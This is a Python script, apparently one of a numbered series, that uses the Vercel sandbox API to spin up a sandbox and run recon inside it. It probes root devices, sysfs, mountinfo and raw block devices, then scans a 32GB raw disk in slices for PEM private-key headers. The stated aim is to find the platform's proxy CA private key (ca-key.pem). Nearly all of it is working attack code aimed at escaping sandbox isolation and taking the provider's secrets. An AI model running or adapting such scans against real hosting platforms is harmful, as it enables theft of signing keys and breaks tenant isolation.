# 实验J130: 设备真相验证 + vdb(32GB) 全盘特征扫描 — ca-key.pem 终极定位
# 阶段A: /dev/root 指向 + vda/vdb 真实边界探测 + /sys/block 全设备 + mountinfo 完整
# 阶段B: vdb 全盘 PEM/ANCHOR 特征扫描(分片5GB, 从未扫过的盘)
# 纯读操作, 零破坏
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=600, args=None, raw=False):
    body = {"command": "python3", "args": (args or ["-c", code]),
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(6):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        time.sleep(4)
    if raw:
        return c, r
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

NAME = "expj130"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c, flush=True)
if c != 200:
    print(r[:300], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

# ===== 阶段 A: 设备真相 =====
PROBE = r"""
import os
print("== /dev/root 链接 ==", flush=True)
try:
    print("ls:", os.popen("ls -la /dev/root 2>&1").read(), flush=True)
    print("readlink:", os.popen("readlink -f /dev/root 2>&1").read(), flush=True)
except Exception as e:
    print("ERR", e, flush=True)

print("== /sys/block 全部设备 ==", flush=True)
print(os.popen("ls -la /sys/block/ 2>&1").read(), flush=True)
print("== /sys/dev/block ==", flush=True)
print(os.popen("ls -la /sys/dev/block/ 2>&1 | head -40").read(), flush=True)
print("== 254:0 设备指向 ==", flush=True)
print(os.popen("ls -la /sys/dev/block/254:0 2>&1; readlink /sys/dev/block/254:0 2>&1").read(), flush=True)

print("== mountinfo 完整(关键行) ==", flush=True)
for line in open("/proc/self/mountinfo"):
    if "vercel/share" in line or line.split()[4] == "/" or "254:" in line:
        print(line.rstrip(), flush=True)

print("== vda/vdb 边界探测 ==", flush=True)
for dev in ["/dev/vda", "/dev/vdb"]:
    f = open(dev, "rb", buffering=0)
    for off in [33 * 2**30, 34 * 2**30, 35 * 2**30, 63 * 2**30, 64 * 2**30, 128 * 2**30]:
        try:
            f.seek(off)
            d = f.read(4096)
            print("%s @%dG: read %d bytes, head=%r" % (dev, off // 2**30, len(d), d[:8]), flush=True)
        except Exception as e:
            print("%s @%dG: ERR %s" % (dev, off // 2**30, type(e).__name__), flush=True)
    f.close()

print("== /run/vercel/share 内容 (宿主卷) ==", flush=True)
for f in sorted(os.listdir("/run/vercel/share"))[:30]:
    p = "/run/vercel/share/" + f
    try:
        st = os.stat(p)
        print("%-40s ino=%d size=%d" % (f, st.st_ino, st.st_size), flush=True)
    except Exception as e:
        print("%-40s ERR %s" % (f, e), flush=True)
print("PROBE_DONE", flush=True)
"""
run_cmd(sid, PROBE, "A-device-truth")

# ===== 阶段 B: vdb 全盘特征扫描 =====
SCAN_SLICE = r"""
import sys, time, hashlib
start = int(sys.argv[1]); end = int(sys.argv[2])
dev = sys.argv[3] if len(sys.argv) > 3 else "/dev/vdb"
feats = [b"-----BEGIN PRIVATE KEY-----", b"-----BEGIN RSA PRIVATE KEY-----",
         b"-----BEGIN EC PRIVATE KEY-----", b"-----BEGIN ENCRYPTED PRIVATE KEY-----",
         b"-----BEGIN OPENSSH PRIVATE KEY-----", b"-----BEGIN CERTIFICATE-----"]
anchor = None
for p in ["/etc/pki/ca-trust/source/anchors/vercel-proxy-ca.pem",
          "/usr/local/share/ca-certificates/vercel-proxy-ca.crt"]:
    try:
        d = open(p, "rb").read()
        anchor = d[:256]
        break
    except Exception:
        pass
BS = 8 * 1024 * 1024
f = open(dev, "rb", buffering=0)
f.seek(start)
pos = start
t0 = time.time()
hits = []
try:
    while pos < end:
        chunk = f.read(BS)
        if not chunk:
            break
        pos += len(chunk)
        for feat in feats:
            i = chunk.find(feat)
            if i >= 0:
                hits.append((pos - len(chunk) + i, feat.decode()))
                print("HIT %d %s" % (pos - len(chunk) + i, feat.decode()), flush=True)
        if anchor:
            i = chunk.find(anchor)
            if i >= 0:
                hits.append((pos - len(chunk) + i, "ANCHOR"))
                print("HIT %d ANCHOR" % (pos - len(chunk) + i), flush=True)
finally:
    f.close()
print("SLICE %d-%d done: %d hits, %.1fs" % (start, end, len(hits), time.time() - t0), flush=True)
print("SLICE_DONE", flush=True)
"""

# vdb 32GB 分 7 片
slices = [(i * 5 * 2**30, (i + 1) * 5 * 2**30) for i in range(7)]
for idx, (s, e) in enumerate(slices):
    print(f"\n--- vdb slice {idx}: {s} - {e} ---", flush=True)
    run_cmd(sid, SCAN_SLICE, f"B-vdb-slice{idx}", args=["-c", SCAN_SLICE, str(s), str(e), "/dev/vdb"])

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
